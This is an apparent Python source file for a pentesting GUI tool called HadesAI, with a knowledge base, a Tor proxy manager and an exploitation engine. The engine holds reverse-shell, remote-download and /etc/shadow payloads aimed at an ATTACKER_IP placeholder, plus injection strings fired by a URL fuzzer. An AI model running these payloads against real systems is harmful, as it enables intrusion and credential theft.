"""
HadesAI - Self-Learning Pentesting & Code Analysis AI
With Interactive Chat, Web Learning, and Tool Execution

💝 Support Development: https://buy.stripe.com/28EbJ1f7ceo3ckyeES5kk00
"""

import os
import sys

# Suppress Qt font warnings before importing PyQt
os.environ['QT_LOGGING_RULES'] = '*.debug=false;qt.text.font.*=false'
import json
import hashlib
import sqlite3
import numpy as np
from datetime import datetime
from collections import defaultdict, Counter
from typing import Dict, List, Any, Optional, Tuple, Callable
from dataclasses import dataclass, field
from pathlib import Path
import re
import threading
import logging
import time
import csv
import socket
import urllib.parse
import concurrent.futures
import urllib3
import ast
import sys
import traceback
from io import StringIO
import os
import logging
import importlib.util
import pyfiglet
from urllib.parse import urljoin
from modules import personality_core_v2 as pcore

# Autonomous Coding Agent Integration
try:
    from autonomouscoding import AutonomousCodingAgent
    HAS_AUTONOMOUS_AGENT = True
except ImportError:
    AutonomousCodingAgent = None
    HAS_AUTONOMOUS_AGENT = False

# Fallback LLM for agent (works without external API)
try:
    from fallback_llm import FallbackLLM
    HAS_FALLBACK_LLM = True
except ImportError:
    FallbackLLM = None
    HAS_FALLBACK_LLM = False

# Cognitive Memory System
try:
    from modules.cognitive_memory import CognitiveLayer, Memory, MemoryStore
    HAS_COGNITIVE_MEMORY = True
except ImportError:
    CognitiveLayer = None
    HAS_COGNITIVE_MEMORY = False

# Autonomous Defense Module
try:
    from modules.autonomous_defense import (
        AutonomousDefenseEngine, DefenseLevel, DefenseAction, DefenseRule,
        integrate_with_network_monitor
    )
    HAS_AUTONOMOUS_DEFENSE = True
except ImportError:
    AutonomousDefenseEngine = None
    HAS_AUTONOMOUS_DEFENSE = False

# Payload Generator GUI
try:
    from payload_generator_gui import PayloadGeneratorTab
    HAS_PAYLOAD_GEN = True
except ImportError:
    PayloadGeneratorTab = None
    HAS_PAYLOAD_GEN = False

# Data Mapping GUI
try:
    from data_mapping_gui import DataMappingTab
    HAS_DATA_MAPPING = True
except ImportError:
    DataMappingTab = None
    HAS_DATA_MAPPING = False

# Realistic Simulations
try:
    from realistic_simulations import create_realistic_simulations_tab
    HAS_REALISTIC_SIMS = True
except ImportError:
    create_realistic_simulations_tab = None
    HAS_REALISTIC_SIMS = False

# Deployment & Testing Automation
try:
    from deployment_automation_gui import DeploymentAutomationTab
    HAS_DEPLOYMENT_AUTOMATION = True
except ImportError:
    DeploymentAutomationTab = None
    HAS_DEPLOYMENT_AUTOMATION = False

# Python Script Editor
try:
    from python_script_editor import PythonScriptEditorTab
    HAS_SCRIPT_EDITOR = True
except ImportError:
    PythonScriptEditorTab = None
    HAS_SCRIPT_EDITOR = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# OpenAI GPT Integration (v1.0+ API)
try:
    from openai import OpenAI
    HAS_OPENAI = True
except ImportError:
    OpenAI = None
    HAS_OPENAI = False

# Mistral AI Integration
try:
    from mistralai import Mistral
    HAS_MISTRAL = True
except ImportError:
    Mistral = None
    HAS_MISTRAL = False

# Ollama Integration (Local LLM - Free, no API key needed)
try:
    import ollama as ollama_lib
    HAS_OLLAMA = True
except ImportError:
    ollama_lib = None
    HAS_OLLAMA = False

# Azure OpenAI Integration (Microsoft's hosted OpenAI)
try:
    from openai import AzureOpenAI
    HAS_AZURE_OPENAI = True
except ImportError:
    AzureOpenAI = None
    HAS_AZURE_OPENAI = False

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QTextEdit, QLabel, QProgressBar, QTabWidget,
    QTreeWidget, QTreeWidgetItem, QComboBox, QLineEdit, QPlainTextEdit,
    QGroupBox, QFormLayout, QSpinBox, QCheckBox, QDoubleSpinBox,
    QSplitter, QStatusBar, QMenuBar, QMenu, QFileDialog,
    QMessageBox, QListWidget, QListWidgetItem, QTableWidget,
    QTableWidgetItem, QHeaderView, QScrollArea
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt6.QtGui import QFont, QColor, QTextCharFormat, QSyntaxHighlighter, QTextCursor

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Preformatted, PageBreak
    from reportlab.lib.enums import TA_LEFT, TA_CENTER
    HAS_REPORTLAB = True
except ImportError:
    HAS_REPORTLAB = False

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("HadesAI")


# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class Experience:
    id: str
    input_data: str
    action_taken: str
    result: str
    reward: float
    timestamp: datetime
    category: str
    metadata: Dict = field(default_factory=dict)


@dataclass
class SecurityPattern:
    pattern_id: str
    pattern_type: str
    signature: str
    confidence: float
    occurrences: int
    examples: List[str]
    countermeasures: List[str]
    cwe_ids: List[str]
    cvss_score: Optional[float] = None


@dataclass 
class CacheEntry:
    path: str
    size: int
    modified: float
    file_hash: str
    file_type: str
    risk_level: str
    browser: str
    content_preview: str = ""
    metadata: Dict = field(default_factory=dict)


@dataclass
class ThreatFinding:
    path: str
    threat_type: str
    pattern: str
    severity: str
    code_snippet: str
    browser: str
    context: str = ""


# ============================================================================
# SYNTAX HIGHLIGHTER
# ============================================================================

class PythonHighlighter(QSyntaxHighlighter):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.highlighting_rules = []
        
        keyword_format = QTextCharFormat()
        keyword_format.setForeground(QColor("#cc7832"))
        keyword_format.setFontWeight(QFont.Weight.Bold)
        keywords = ['and', 'as', 'assert', 'break', 'class', 'continue', 'def',
            'del', 'elif', 'else', 'except', 'finally', 'for', 'from',
            'global', 'if', 'import', 'in', 'is', 'lambda', 'not', 'or',
            'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']
        for word in keywords:
            self.highlighting_rules.append((re.compile(rf'\b{word}\b'), keyword_format))
        
        string_format = QTextCharFormat()
        string_format.setForeground(QColor("#6a8759"))
        self.highlighting_rules.append((re.compile(r'"[^"\\]*(\\.[^"\\]*)*"'), string_format))
        self.highlighting_rules.append((re.compile(r"'[^'\\]*(\\.[^'\\]*)*'"), string_format))
        
        comment_format = QTextCharFormat()
        comment_format.setForeground(QColor("#808080"))
        self.highlighting_rules.append((re.compile(r'#.*'), comment_format))

    def highlightBlock(self, text):
        for pattern, fmt in self.highlighting_rules:
            for match in pattern.finditer(text):
                self.setFormat(match.start(), match.end() - match.start(), fmt)


# ============================================================================
# KNOWLEDGE BASE
# ============================================================================
# Banner
print(pyfiglet.figlet_format("Hades AI"))
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("HadesAI")
logger.info("Hades AI Core initialized...")

MODULE_DIR = "modules"
loaded_modules = {}

def parse_command(command):
    parts = command.strip().split(maxsplit=1)
    return parts if len(parts) == 2 else (parts[0], None)

def load_module(module_name):
    module_path = os.path.join(MODULE_DIR, f"{module_name}.py")
    if not os.path.isfile(module_path):
        return f"Module '{module_name}' not found."

    spec = importlib.util.spec_from_file_location(module_name, module_path)
    module = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(module)
        loaded_modules[module_name] = module
        return f"Module '{module_name}' loaded."
    except Exception as e:
        return f"Failed to load module '{module_name}': {str(e)}"

def list_modules():
    if not os.path.exists(MODULE_DIR):
        os.makedirs(MODULE_DIR)
    files = [f[:-3] for f in os.listdir(MODULE_DIR) if f.endswith(".py")]
    return files if files else ["No modules found."]

def execute_module(module_name):
    module = loaded_modules.get(module_name)
    if not module:
        return f"Module '{module_name}' not loaded."
    if hasattr(module, "main"):
        return module.main()
    return f"Module '{module_name}' does not have a 'main()' function."

def handle_command(action, target):
    if action == "scan":
        return f"Scanning {target}..."
    elif action == "purge":
        return f"Purging {target}..."
    elif action == "initiate":
        return f"Initiating {target}..."
    elif action == "terminate":
        return f"Terminating {target}..."
    elif action == "echo":
        return f"Hades echoes: {target}"
    elif action == "help":
        return "Commands: scan, purge, initiate, terminate, echo, help, load <module>, list modules, execute <module>"
    elif action == "list" and target == "modules":
        return "\n".join(list_modules())
    elif action == "load":
        return load_module(target)
    elif action == "execute":
        return execute_module(target)
    else:
        return "Hades does not comprehend your command."
class KnowledgeBase:
    def __init__(self, db_path: str = "hades_knowledge.db"):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.lock = threading.Lock()
        self._init_db()
        
    def _init_db(self):
        cursor = self.conn.cursor()

        cursor.execute('''CREATE TABLE IF NOT EXISTS security_patterns (
            pattern_id TEXT PRIMARY KEY, pattern_type TEXT, signature TEXT,
            confidence REAL, occurrences INTEGER, examples TEXT,
            countermeasures TEXT, cwe_ids TEXT, cvss_score REAL)''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS threat_findings (
            id INTEGER PRIMARY KEY AUTOINCREMENT, path TEXT, threat_type TEXT,
            pattern TEXT, severity TEXT, code_snippet TEXT, browser TEXT,
            context TEXT, detected_at TEXT)''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS learned_exploits (
            id INTEGER PRIMARY KEY AUTOINCREMENT, source_url TEXT, exploit_type TEXT,
            code TEXT, description TEXT, learned_at TEXT, success_count INTEGER,
            fail_count INTEGER)''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS chat_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, role TEXT, message TEXT,
            timestamp TEXT, context TEXT)''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS web_learnings (
            id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, content_type TEXT,
            patterns_found TEXT, exploits_found TEXT, learned_at TEXT)''')
        
        # NEW: Techniques table for normalized security knowledge
        cursor.execute('''CREATE TABLE IF NOT EXISTS techniques (
            technique_id TEXT PRIMARY KEY,
            name TEXT NOT NULL,
            category TEXT NOT NULL,
            description TEXT,
            indicators TEXT,
            mitigations TEXT,
            detection_rules TEXT,
            references_json TEXT,
            confidence REAL DEFAULT 0.5,
            occurrences INTEGER DEFAULT 1,
            updated_at TEXT)''')
        
        # NEW: Attack events for behavioral learning
        cursor.execute('''CREATE TABLE IF NOT EXISTS attack_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            event_type TEXT NOT NULL,
            src_ip TEXT,
            dst_port INTEGER,
            severity TEXT,
            evidence TEXT,
            action_taken TEXT,
            technique_id TEXT,
            created_at TEXT,
            FOREIGN KEY (technique_id) REFERENCES techniques(technique_id))''')
        
        # NEW: CVE database for vulnerability knowledge
        cursor.execute('''CREATE TABLE IF NOT EXISTS cves (
            cve_id TEXT PRIMARY KEY,
            summary TEXT,
            cwe_ids TEXT,
            cvss REAL,
            affected_products TEXT,
            references_json TEXT,
            mitigations TEXT,
            published TEXT,
            last_modified TEXT)''')
        
        # NEW: IP reputation tracking
        cursor.execute('''CREATE TABLE IF NOT EXISTS ip_reputation (
            ip_address TEXT PRIMARY KEY,
            threat_score REAL DEFAULT 0.0,
            attack_count INTEGER DEFAULT 0,
            first_seen TEXT,
            last_seen TEXT,
            categories TEXT,
            is_blocked INTEGER DEFAULT 0,
            notes TEXT)''')

        self.conn.commit()
    
    # ========== Technique Management ==========
    def store_technique(self, technique_id: str, name: str, category: str, 
                        description: str = "", indicators: List[str] = None,
                        mitigations: List[str] = None, detection_rules: List[str] = None,
                        references: List[str] = None, confidence: float = 0.5):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO techniques
                (technique_id, name, category, description, indicators, mitigations, 
                 detection_rules, references_json, confidence, occurrences, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 
                    COALESCE((SELECT occurrences + 1 FROM techniques WHERE technique_id = ?), 1), ?)''',
                (technique_id, name, category, description,
                 json.dumps(indicators or []), json.dumps(mitigations or []),
                 json.dumps(detection_rules or []), json.dumps(references or []),
                 confidence, technique_id, datetime.now().isoformat()))
            self.conn.commit()
    
    def search_techniques(self, query: str, limit: int = 5) -> List[Dict]:
        """Search techniques by keyword"""
        cursor = self.conn.cursor()
        query_pattern = f"%{query.lower()}%"
        cursor.execute('''SELECT * FROM techniques 
            WHERE LOWER(name) LIKE ? OR LOWER(category) LIKE ? OR LOWER(description) LIKE ?
            ORDER BY occurrences DESC, confidence DESC LIMIT ?''',
            (query_pattern, query_pattern, query_pattern, limit))
        return [self._row_to_technique(r) for r in cursor.fetchall()]
    
    def get_technique_by_category(self, category: str, limit: int = 10) -> List[Dict]:
        cursor = self.conn.cursor()
        cursor.execute('''SELECT * FROM techniques WHERE LOWER(category) = LOWER(?)
            ORDER BY occurrences DESC LIMIT ?''', (category, limit))
        return [self._row_to_technique(r) for r in cursor.fetchall()]
    
    def _row_to_technique(self, row) -> Dict:
        return {
            'technique_id': row[0], 'name': row[1], 'category': row[2],
            'description': row[3], 'indicators': json.loads(row[4] or '[]'),
            'mitigations': json.loads(row[5] or '[]'),
            'detection_rules': json.loads(row[6] or '[]'),
            'references': json.loads(row[7] or '[]'),
            'confidence': row[8], 'occurrences': row[9], 'updated_at': row[10]
        }
    
    # ========== Attack Event Logging ==========
    def log_attack_event(self, event_type: str, src_ip: str, dst_port: int = 0,
                         severity: str = "MEDIUM", evidence: Dict = None,
                         action_taken: str = "", technique_id: str = None):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT INTO attack_events
                (event_type, src_ip, dst_port, severity, evidence, action_taken, technique_id, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                (event_type, src_ip, dst_port, severity, json.dumps(evidence or {}),
                 action_taken, technique_id, datetime.now().isoformat()))
            self.conn.commit()
            
            # Update IP reputation
            self._update_ip_reputation(src_ip, event_type, severity)
    
    def get_attack_events(self, limit: int = 100, src_ip: str = None) -> List[Dict]:
        cursor = self.conn.cursor()
        if src_ip:
            cursor.execute('SELECT * FROM attack_events WHERE src_ip = ? ORDER BY created_at DESC LIMIT ?',
                          (src_ip, limit))
        else:
            cursor.execute('SELECT * FROM attack_events ORDER BY created_at DESC LIMIT ?', (limit,))
        return [{
            'id': r[0], 'event_type': r[1], 'src_ip': r[2], 'dst_port': r[3],
            'severity': r[4], 'evidence': json.loads(r[5] or '{}'),
            'action_taken': r[6], 'technique_id': r[7], 'created_at': r[8]
        } for r in cursor.fetchall()]
    
    # ========== IP Reputation ==========
    def _update_ip_reputation(self, ip: str, event_type: str, severity: str):
        severity_scores = {'LOW': 0.1, 'MEDIUM': 0.3, 'HIGH': 0.6, 'CRITICAL': 1.0}
        score_delta = severity_scores.get(severity, 0.3)
        
        cursor = self.conn.cursor()
        cursor.execute('SELECT threat_score, attack_count, categories FROM ip_reputation WHERE ip_address = ?', (ip,))
        row = cursor.fetchone()
        
        now = datetime.now().isoformat()
        if row:
            new_score = min(10.0, row[0] + score_delta)
            categories = json.loads(row[2] or '[]')
            if event_type not in categories:
                categories.append(event_type)
            cursor.execute('''UPDATE ip_reputation 
                SET threat_score = ?, attack_count = attack_count + 1, 
                    last_seen = ?, categories = ?
                WHERE ip_address = ?''',
                (new_score, now, json.dumps(categories), ip))
        else:
            cursor.execute('''INSERT INTO ip_reputation 
                (ip_address, threat_score, attack_count, first_seen, last_seen, categories)
                VALUES (?, ?, 1, ?, ?, ?)''',
                (ip, score_delta, now, now, json.dumps([event_type])))
        self.conn.commit()
    
    def get_ip_reputation(self, ip: str) -> Optional[Dict]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM ip_reputation WHERE ip_address = ?', (ip,))
        row = cursor.fetchone()
        if row:
            return {
                'ip': row[0], 'threat_score': row[1], 'attack_count': row[2],
                'first_seen': row[3], 'last_seen': row[4],
                'categories': json.loads(row[5] or '[]'),
                'is_blocked': bool(row[6]), 'notes': row[7]
            }
        return None
    
    def get_malicious_ips(self, min_score: float = 3.0) -> List[str]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT ip_address FROM ip_reputation WHERE threat_score >= ?', (min_score,))
        return [r[0] for r in cursor.fetchall()]
    
    def block_ip(self, ip: str, reason: str = ""):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO ip_reputation 
                (ip_address, threat_score, attack_count, first_seen, last_seen, is_blocked, notes)
                VALUES (?, 10.0, COALESCE((SELECT attack_count FROM ip_reputation WHERE ip_address = ?), 1),
                    COALESCE((SELECT first_seen FROM ip_reputation WHERE ip_address = ?), ?), ?, 1, ?)''',
                (ip, ip, ip, datetime.now().isoformat(), datetime.now().isoformat(), reason))
            self.conn.commit()
    
    # ========== CVE Management ==========
    def store_cve(self, cve_id: str, summary: str, cwe_ids: List[str] = None,
                  cvss: float = 0.0, affected: List[str] = None,
                  references: List[str] = None, mitigations: List[str] = None):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO cves
                (cve_id, summary, cwe_ids, cvss, affected_products, references_json, mitigations, 
                 published, last_modified)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (cve_id, summary, json.dumps(cwe_ids or []), cvss,
                 json.dumps(affected or []), json.dumps(references or []),
                 json.dumps(mitigations or []), datetime.now().isoformat(), datetime.now().isoformat()))
            self.conn.commit()
    
    def search_cves(self, query: str, limit: int = 10) -> List[Dict]:
        cursor = self.conn.cursor()
        if query.upper().startswith('CVE-'):
            cursor.execute('SELECT * FROM cves WHERE cve_id = ?', (query.upper(),))
        else:
            cursor.execute('''SELECT * FROM cves WHERE LOWER(summary) LIKE ? 
                OR LOWER(affected_products) LIKE ? ORDER BY cvss DESC LIMIT ?''',
                (f'%{query.lower()}%', f'%{query.lower()}%', limit))
        return [{
            'cve_id': r[0], 'summary': r[1], 'cwe_ids': json.loads(r[2] or '[]'),
            'cvss': r[3], 'affected': json.loads(r[4] or '[]'),
            'references': json.loads(r[5] or '[]'), 'mitigations': json.loads(r[6] or '[]'),
            'published': r[7], 'last_modified': r[8]
        } for r in cursor.fetchall()]
    
    # ========== Intelligent Query ==========
    def query_knowledge(self, query: str, context: str = "") -> Dict[str, Any]:
        """Query all knowledge sources for relevant information"""
        results = {
            'techniques': self.search_techniques(query, 3),
            'patterns': [],
            'cves': self.search_cves(query, 3),
            'exploits': [],
            'ip_info': None
        }
        
        # Check for IP address in query
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', query)
        if ip_match:
            results['ip_info'] = self.get_ip_reputation(ip_match.group())
        
        # Search patterns
        cursor = self.conn.cursor()
        cursor.execute('''SELECT * FROM security_patterns 
            WHERE LOWER(pattern_type) LIKE ? OR LOWER(signature) LIKE ?
            ORDER BY occurrences DESC LIMIT 3''',
            (f'%{query.lower()}%', f'%{query.lower()}%'))
        results['patterns'] = self.get_patterns()[:3]
        
        # Search exploits
        cursor.execute('''SELECT * FROM learned_exploits
            WHERE LOWER(exploit_type) LIKE ? OR LOWER(description) LIKE ?
            ORDER BY success_count DESC LIMIT 3''',
            (f'%{query.lower()}%', f'%{query.lower()}%'))
        results['exploits'] = [{
            'type': r[2], 'source': r[1], 'description': r[4]
        } for r in cursor.fetchall()]
        
        return results
    def get_patterns(self) -> List[dict]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM security_patterns')
        return [
        {
        'pattern_id': r[0], 'pattern_type': r[1], 'signature': r[2],
        'confidence': r[3], 'occurrences': r[4], 'examples': json.loads(r[5]),
        'countermeasures': json.loads(r[6]), 'cwe_ids': json.loads(r[7]), 'cvss_score': r[8]
        }
        for r in cursor.fetchall()
        ]


    def store_threat_finding(self, finding):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT INTO threat_findings
            (path, threat_type, pattern, severity, code_snippet, browser, context, detected_at)
            VALUES (?,?,?,?,?,?,?,?)''',
            (finding.path, finding.threat_type, finding.pattern, finding.severity,
            finding.code_snippet, finding.browser, finding.context, datetime.now().isoformat()))
            self.conn.commit()


    def get_threat_findings(self, limit: int = 100) -> List[Dict]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM threat_findings ORDER BY detected_at DESC LIMIT ?', (limit,))
        return [
        {
        'id': r[0], 'path': r[1], 'threat_type': r[2], 'pattern': r[3],
        'severity': r[4], 'code_snippet': r[5], 'browser': r[6],
        'context': r[7], 'detected_at': r[8]
        }
        for r in cursor.fetchall()
        ]


    def store_learned_exploit(self, source_url: str, exploit_type: str, code: str, description: str):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT INTO learned_exploits
            (source_url, exploit_type, code, description, learned_at, success_count, fail_count)
            VALUES (?,?,?,?,?,0,0)''',
            (source_url, exploit_type, code, description, datetime.now().isoformat()))
            self.conn.commit()


    def get_learned_exploits(self, limit: int = 50) -> List[Dict]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM learned_exploits ORDER BY learned_at DESC LIMIT ?', (limit,))
        return [
        {
        'id': r[0], 'source_url': r[1], 'exploit_type': r[2], 'code': r[3],
        'description': r[4], 'learned_at': r[5], 'success_count': r[6], 'fail_count': r[7]
        }
        for r in cursor.fetchall()
        ]


    def store_chat(self, role: str, message: str, context: str = ""):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('INSERT INTO chat_history (role, message, timestamp, context) VALUES (?,?,?,?)',
            (role, message, datetime.now().isoformat(), context))
            self.conn.commit()


    def get_chat_history(self, limit: int = 50) -> List[Dict]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT role, message, timestamp FROM chat_history ORDER BY id DESC LIMIT ?', (limit,))
        return [
        {'role': r[0], 'message': r[1], 'timestamp': r[2]} for r in reversed(cursor.fetchall())
        ]


    def store_web_learning(self, url: str, content_type: str, patterns: List, exploits: List):
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute('''INSERT INTO web_learnings
            (url, content_type, patterns_found, exploits_found, learned_at)
            VALUES (?,?,?,?,?)''',
            (url, content_type, json.dumps(patterns), json.dumps(exploits), datetime.now().isoformat()))
            self.conn.commit()


    def fetch_recent_web_patterns(self, limit=1) -> List[str]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT patterns_found FROM web_learnings ORDER BY learned_at DESC LIMIT ?', (limit,))
        return [json.loads(row[0]) for row in cursor.fetchall() if row[0]]


# ============================================================================
# WEB LEARNER - Learn from websites
# ============================================================================

# ============================================================================
# PROXY MANAGER - Tor/SOCKS/HTTP Proxy Support
# ============================================================================

class ProxyManager:
    TOR_DEFAULT = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    
    def __init__(self):
        self.enabled = False
        self.proxy_type = 'none'  # none, tor, socks5, http
        self.proxy_host = '127.0.0.1'
        self.proxy_port = 9050
        self.proxy_user = None
        self.proxy_pass = None
        self.rotate_enabled = False
        self.proxy_list = []
        self.current_proxy_idx = 0
        
    def get_proxies(self) -> Optional[Dict]:
        if not self.enabled:
            return None
            
        if self.proxy_type == 'tor':
            return self.TOR_DEFAULT
        elif self.proxy_type == 'socks5':
            auth = f"{self.proxy_user}:{self.proxy_pass}@" if self.proxy_user else ""
            proxy_url = f"socks5h://{auth}{self.proxy_host}:{self.proxy_port}"
            return {'http': proxy_url, 'https': proxy_url}
        elif self.proxy_type == 'http':
            auth = f"{self.proxy_user}:{self.proxy_pass}@" if self.proxy_user else ""
            proxy_url = f"http://{auth}{self.proxy_host}:{self.proxy_port}"
            return {'http': proxy_url, 'https': proxy_url}
        elif self.proxy_type == 'rotating' and self.proxy_list:
            proxy = self.proxy_list[self.current_proxy_idx % len(self.proxy_list)]
            self.current_proxy_idx += 1
            return {'http': proxy, 'https': proxy}
        return None
    
    def get_session(self) -> requests.Session:
        session = requests.Session()
        proxies = self.get_proxies()
        if proxies:
            session.proxies.update(proxies)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        retries = Retry(total=3, backoff_factor=0.5)
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.mount('https://', HTTPAdapter(max_retries=retries))
        return session
    
    def test_connection(self) -> Dict:
        try:
            session = self.get_session()
            r = session.get('https://api.ipify.org?format=json', timeout=10)
            return {'success': True, 'ip': r.json().get('ip'), 'proxy': self.proxy_type}
        except Exception as e:
            return {'success': False, 'error': str(e)}


# ============================================================================
# ACTIVE EXPLOITATION MODULE
# ============================================================================

class ExploitationEngine:
    CMD_PAYLOADS = {
        'linux': {
            'whoami': ['whoami', '$(whoami)', '`whoami`', ';whoami', '|whoami', '\nwhoami'],
            'id': ['id', '$(id)', '`id`', ';id', '|id'],
            'ls': ['ls', 'ls -la', '$(ls)', ';ls -la', '|ls'],
            'pwd': ['pwd', '$(pwd)', ';pwd', '|pwd'],
            'uname': ['uname -a', '$(uname -a)', ';uname -a'],
            'cat_passwd': ['cat /etc/passwd', ';cat /etc/passwd', '|cat /etc/passwd'],
            'cat_shadow': ['cat /etc/shadow', ';cat /etc/shadow'],
            'ifconfig': ['ifconfig', 'ip addr', ';ifconfig', '|ip addr'],
            'netstat': ['netstat -an', 'ss -tuln', ';netstat -an'],
            'ps': ['ps aux', 'ps -ef', ';ps aux'],
            'env': ['env', 'printenv', ';env', '$(env)'],
            'curl': ['curl http://ATTACKER_IP', 'wget http://ATTACKER_IP'],
            'reverse_shell': [
                'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
                'nc -e /bin/sh ATTACKER_IP PORT',
                'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            ]
        },
        'windows': {
            'whoami': ['whoami', '& whoami', '| whoami', '\r\nwhoami'],
            'dir': ['dir', '& dir', '| dir', 'dir /s'],
            'ipconfig': ['ipconfig', 'ipconfig /all', '& ipconfig'],
            'net_user': ['net user', '& net user', 'net localgroup administrators'],
            'systeminfo': ['systeminfo', '& systeminfo'],
            'tasklist': ['tasklist', '& tasklist'],
            'netstat': ['netstat -an', '& netstat -an'],
            'powershell': [
                'powershell -c "whoami"',
                'powershell -enc BASE64_PAYLOAD',
                'powershell IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER_IP/shell.ps1\')'
            ],
            'certutil': ['certutil -urlcache -split -f http://ATTACKER_IP/payload.exe'],
        }
    }
    
    INJECTION_CONTEXTS = {
        'command': [';', '|', '`', '$(',  ')', '\n', '\r\n', '&&', '||'],
        'sql': ["'", '"', '--', '/*', '*/', ';--', "' OR '1'='1", "1 OR 1=1"],
        'xss': ['<script>', '</script>', 'javascript:', 'onerror=', 'onload='],
        'ssti': ['{{', '}}', '${', '}', '<%', '%>', '{#', '#}'],
        'xxe': ['<!DOCTYPE', '<!ENTITY', 'SYSTEM', 'file://'],
    }
    
    def __init__(self, proxy_manager: ProxyManager = None):
        self.proxy = proxy_manager or ProxyManager()
        self.results = []
        
    def generate_payloads(self, payload_type: str, os_type: str = 'linux', 
                          attacker_ip: str = '', attacker_port: str = '4444') -> List[Dict]:
        payloads = []
        
        os_payloads = self.CMD_PAYLOADS.get(os_type, self.CMD_PAYLOADS['linux'])
        if payload_type in os_payloads:
            for payload in os_payloads[payload_type]:
                p = payload.replace('ATTACKER_IP', attacker_ip).replace('PORT', attacker_port)
                payloads.append({
                    'payload': p,
                    'type': payload_type,
                    'os': os_type,
                    'context': 'command'
                })
        
        return payloads
    
    def fuzz_parameter(self, url: str, param: str, payloads: List[str], 
                       method: str = 'GET') -> List[Dict]:
        if not HAS_REQUESTS:
            return [{'error': 'requests not installed'}]
            
        results = []
        session = self.proxy.get_session()
        
        for payload in payloads:
            try:
                if method.upper() == 'GET':
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    r = session.get(test_url, timeout=10, verify=False)
                else:
                    r = session.post(url, data={param: payload}, timeout=10, verify=False)
                
                indicators = self._check_exploitation_indicators(r.text, payload)
                
                results.append({
                    'payload': payload,
                    'status': r.status_code,
                    'length': len(r.content),
                    'indicators': indicators,
                    'vulnerable': len(indicators) > 0
                })
                
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})
                
        return results
    
    def _check_exploitation_indicators(self, response: str, payload: str) -> List[str]:
        indicators = []
        response_lower = response.lower()
        
        success_patterns = [
            ('uid=', 'Linux user ID found'),
            ('gid=', 'Linux group ID found'),
            ('root:', 'Passwd file content'),
            ('www-data', 'Web user found'),
            ('WINDOWS', 'Windows system'),
            ('Administrator', 'Admin user found'),
            ('Directory of', 'Windows dir listing'),
            ('total ', 'Linux dir listing'),
            ('inet ', 'Network interface'),
            ('eth0', 'Network interface'),
            ('127.0.0.1', 'Localhost reference'),
        ]
        
        for pattern, desc in success_patterns:
            if pattern.lower() in response_lower:
                indicators.append(desc)
                
        return indicators


# ============================================================================
# NETWORK MONITOR - Active Defense System
# ============================================================================

class NetworkMonitor(QThread):
    """Real-time network connection monitor with threat detection and active defense"""
    connection_detected = pyqtSignal(dict)
    threat_detected = pyqtSignal(dict)
    status_update = pyqtSignal(str)
    stats_update = pyqtSignal(dict)
    auto_response = pyqtSignal(dict)  # NEW: Signal for automatic responses
    
    THREAT_PORTS = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
        135: 'RPC', 139: 'NetBIOS', 445: 'SMB', 1433: 'MSSQL', 1434: 'MSSQL-UDP',
        3306: 'MySQL', 3389: 'RDP', 4444: 'Metasploit', 5432: 'PostgreSQL',
